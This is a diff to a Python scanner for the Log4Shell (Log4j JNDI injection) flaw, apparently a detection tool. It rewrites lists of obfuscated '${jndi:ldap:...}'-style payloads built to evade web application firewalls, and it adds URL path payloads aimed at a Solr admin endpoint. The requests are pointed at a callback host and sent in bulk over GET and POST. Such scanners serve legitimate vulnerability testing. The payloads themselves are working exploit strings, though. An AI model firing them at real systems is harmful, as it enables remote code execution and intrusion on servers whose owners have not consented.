@@ -53,30 +53,19 @@ default_headers = {
 }
 post_data_parameters = ["username", "user", "email", "email_address", "password"]
 timeout = 4
-waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_host}}/{{random}}}",
-                       "${${::-j}ndi:rmi://{{callback_host}}/{{random}}}",
-                       "${jndi:rmi://{{callback_host}}}",
-                       "${${lower:jndi}:${lower:rmi}://{{callback_Host}}/{{random}}}",
-                       "${${lower:${lower:jndi}}:${lower:rmi}://{{callback_host/{{random}}}",
-                       "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{callback_host}}/{{random}}}",
-                       "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{callback_host}}/{{random}}}",
-                       "${jndi:dns://{{callback_host}}}"]
 
-protocols = [f'jndi:rmi:',
-            f"jndi:dns:",
+protocols = [f"jndi:ldap:",
+            f'${{env:BARFOO:-j}}ndi${{env:BARFOO:-:}}${{env:BARFOO:-l}}dap${{env:BARFOO:-:}}'
             f'j${{k8s:k5:-ND}}i${{sd:k5:-:}}',
             f'j${{mAin:\k5:-Nd}}i${{sPrIng:k5:-:}}',
             f'j${{sYs:k5:-nD}}${{loWer:i${{weB:k5:-:}}}}',
             f'j${{::-nD}}i${{::-:}}',
-            f'j${{EnV:K5:-nD}}i:ldap:',
-            f'j${{loWeR:Nd}}i${{uPpeR::}}'
-            f"${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-r}}${{::-m}}${{::-i}}:",
-            f"${{::-j}}ndi:rmi:",
-            f"${{lower:jndi}}:${{lower:rmi}}:",
-            f"${{lower:${{lower:jndi}}}}:${{lower:rmi}}:",
-            f"${{lower:j}}${{lower:n}}${{lower:d}}i:${{lower:rmi}}:",
-            f"${{lower:j}}${{upper:n}}${{lower:d}}${{upper:i}}:${{lower:r}}m${{lower:i}}:"
-            ]
+            f'j${{EnV:K5:-nD}}i:ldap:',]
+
+paths = ['/',
+    f'/solr/admin/collections?action=${{jndi:ldap://{{callback_host}}/{{random}}}}',
+    f'/$%7B$%7Benv:BARFOO:-j%7Dndi$%7Benv:BARFOO:-:%7D$%7Benv:BARFOO:-l%7Ddap$%7Benv:BARFOO:-:%7D//{{callback_host}}/{{random}}%7B'
+]
 
 parser = argparse.ArgumentParser()
 parser.add_argument("-u", "--url",
@@ -168,9 +157,14 @@ def get_fuzzing_post_data(payload):
 
 
 def generate_waf_bypass_payloads(callback_host, random_string):
+    global protocols
     payloads = [f'${{{p}//{callback_host}/{random_string}}}' for p in protocols]
     return payloads
 
+def generate_path_payloads(callback_host, random_string):
+    global paths
+    paths = [p.replace(f'{{callback_host}}', callback_host).replace(f'{{random}}', random_string) for p in paths]
+    return paths
 
 class Dnslog(object):
     def __init__(self):
@@ -285,63 +279,26 @@ def scan_url(url, callback_host):
     payloads = [payload]
     if args.waf_bypass_payloads:
         payloads.extend(generate_waf_bypass_payloads(f'{parsed_url["host"]}.{callback_host}', random_string))
+    paths = generate_path_payloads(f'{parsed_url["host"]}.{callback_host}', random_string)
     for payload in payloads:
         cprint(f"[•] URL: {url} | PAYLOAD: {payload}", "cyan")
         if args.request_type.upper() == "GET" or args.run_all_tests:
             try:
-                futures.append(async_session.get(url=url,
-                                 headers=get_fuzzing_headers(payload),
-                                 verify=False,
-                                 timeout=timeout))
-                futures.append(async_session.get(url=url,
-                                 params={"x": payload},
-                                 headers=get_fuzzing_headers(payload),
-                                 verify=False,
-                                 timeout=timeout))
-                futures.append(async_session.get(url=url+'/'+payload,
-                                 params={"x": payload},
-                                 headers=get_fuzzing_headers(payload),
-                                 verify=False,
-                                 timeout=timeout))
+                for path in paths:
+                    futures.append(async_session.get(url=url+path,
+                                    headers=get_fuzzing_headers(payload),
+                                    verify=False,
+                                    timeout=timeout))
             except Exception as e:
                 cprint(f"EXCEPTION: {e}")
 
         if args.request_type.upper() == "POST" or args.run_all_tests:
             try:
-                # Post body
-                futures.append(async_session.post(url=url,
-                                 headers=get_fuzzing_headers(payload),
-                                 data=get_fuzzing_post_data(payload),
-                                 verify=False,
-                                 timeout=timeout))
-                futures.append(async_session.post(url=url,
-                                 params={"x": payload},
-                                 headers=get_fuzzing_headers(payload),
-                                 data=get_fuzzing_post_data(payload),
-                                 verify=False,
-                                 timeout=timeout))
-                futures.append(async_session.post(url=url+'/'+payload,
-                                 params={"x": payload},
-                                 headers=get_fuzzing_headers(payload),
-                                 data=get_fuzzing_post_data(payload),
-                                 verify=False,
-                                 timeout=timeout))
-            except Exception as e:
-                cprint(f"EXCEPTION: {e}")
-
-            try:
-                # JSON body
-                futures.append(async_session.post(url=url,
-                                 headers=get_fuzzing_headers(payload),
-                                 json=get_fuzzing_post_data(payload),
-                                 verify=False,
-                                 timeout=timeout))
-                futures.append(async_session.post(url=url,
-                                 params={"v": payload},
-                                 headers=get_fuzzing_headers(payload),
-                                 json=get_fuzzing_post_data(payload),
-                                 verify=False,
-                                 timeout=timeout))
+                for path in paths:
+                    futures.append(async_session.post(url=url+path,
+                                    headers=get_fuzzing_headers(payload),
+                                    verify=False,
+                                    timeout=timeout))
             except Exception as e:
                 cprint(f"EXCEPTION: {e}")
 
@@ -456,7 +413,6 @@ def main():
         for i in records:
             cprint(i, "yellow")
 
-
 if __name__ == "__main__":
     try:
         main()
@@ -466,7 +422,7 @@ if __name__ == "__main__":
                     res = f.result()
                     cprint(f"[•] URL: {res.url} | RESPONSE: {res.status_code}", "cyan")
                 except Exception as e:
-                    cprint(f"[•] URL: {res.url} | EXCEPTION: {e}", "red")
+                    cprint(f"EXCEPTION: {e}", "red")
     except KeyboardInterrupt:
         print("\nKeyboardInterrupt Detected.")
         print("Exiting...")
